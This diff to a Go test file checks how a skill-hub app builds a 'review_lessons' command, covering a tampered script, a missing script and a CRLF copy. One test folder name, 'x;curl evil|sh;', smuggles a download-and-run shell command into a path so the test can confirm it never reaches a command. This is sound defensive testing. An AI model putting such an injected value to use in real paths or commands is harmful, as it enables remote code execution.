@@ -1,6 +1,7 @@
 package app
 
 import (
+	"bytes"
 	"context"
 	"errors"
 	"os"
@@ -627,13 +628,79 @@ lessons:
 	if reviewAction.ID != "candidate-skill" {
 		t.Fatalf("expected review_lessons ID 'candidate-skill', got %q", reviewAction.ID)
 	}
-	if reviewAction.Command != "distill.py list skills/default/candidate-skill/.meta/distill.yaml" {
-		t.Fatalf("expected command 'distill.py list skills/default/candidate-skill/.meta/distill.yaml', got %q", reviewAction.Command)
+	// Init installed distill-lab in the hub, so the command is offered.
+	if reviewAction.Command != "node .agents/skills/distill-lab/scripts/distill.mjs list skills/default/candidate-skill/.meta/distill.yaml" {
+		t.Fatalf("command = %q", reviewAction.Command)
 	}
-	if strings.HasPrefix(reviewAction.Command, "python3 .claude") {
-		t.Fatalf("command must not emit repo-only path: %q", reviewAction.Command)
+	if reviewAction.Script != ".agents/skills/distill-lab/scripts/distill.mjs" || reviewAction.File != "skills/default/candidate-skill/.meta/distill.yaml" || !reviewAction.HubRelative {
+		t.Fatalf("structured fields = %+v", *reviewAction)
 	}
-	if !strings.Contains(reviewAction.Summary, "distill-lab skill's distill.py script") {
-		t.Fatalf("expected summary to reference distill-lab skill's script, got %q", reviewAction.Summary)
+	if reviewAction.Summary != "2 candidate lessons ready for review with the distill-lab skill in the hub folder; 1 is high-value" {
+		t.Fatalf("summary = %q", reviewAction.Summary)
+	}
+
+	script := filepath.Join(root, ".agents", "skills", "distill-lab", "scripts", "distill.mjs")
+	original := readFile(t, script)
+	tampered := append([]byte(nil), original...)
+	tampered[len(tampered)/2] ^= 1
+	writeFile(t, script, tampered)
+	if action := homeAction(t, root, "review_lessons"); action.Command != "" || action.File != "" || !strings.Contains(action.Summary, "run `skillhub doctor`") {
+		t.Fatalf("tampered script still offered: %+v", *action)
+	}
+	if err := os.Remove(script); err != nil {
+		t.Fatal(err)
+	}
+	if action := homeAction(t, root, "review_lessons"); action.Command != "" {
+		t.Fatalf("missing script still offered: %+v", *action)
+	}
+	writeFile(t, script, bytes.ReplaceAll(original, []byte("\n"), []byte("\r\n")))
+	if action := homeAction(t, root, "review_lessons"); action.Command == "" {
+		t.Fatalf("a CRLF checkout of the script is not intact: %+v", *action)
+	}
+	writeFile(t, script, original)
+
+	// A candidate under folders that are not canonical ids counts but never
+	// reaches a command, even when it has the most candidates.
+	evil := filepath.Join(root, "skills", "x;curl evil|sh;", "id", ".meta")
+	if err := os.MkdirAll(evil, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	writeFile(t, filepath.Join(evil, "distill.yaml"), []byte(strings.Replace(distillDoc, "decision: {state: planned}", "decision: {state: candidate}", 1)))
+	// Such a folder also fails validation, which hides the action, so the
+	// count is checked where the path is chosen.
+	total, _, topID, topPath := countCandidateLessons(root)
+	if total != 5 || topID != "candidate-skill" || topPath != "skills/default/candidate-skill/.meta/distill.yaml" {
+		t.Fatalf("unsafe candidate path chosen: total=%d id=%q path=%q", total, topID, topPath)
+	}
+}
+
+func homeAction(t *testing.T, root, kind string) *ActionItem {
+	t.Helper()
+	home, err := (CurationService{}).GetCurationHome(context.Background(), root)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for index := range home.Actions {
+		if home.Actions[index].Kind == kind {
+			return &home.Actions[index]
+		}
+	}
+	t.Fatalf("no %s action in %+v", kind, home.Actions)
+	return nil
+}
+
+func readFile(t *testing.T, path string) []byte {
+	t.Helper()
+	raw, err := os.ReadFile(path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return raw
+}
+
+func writeFile(t *testing.T, path string, raw []byte) {
+	t.Helper()
+	if err := os.WriteFile(path, raw, 0o644); err != nil {
+		t.Fatal(err)
 	}
 }
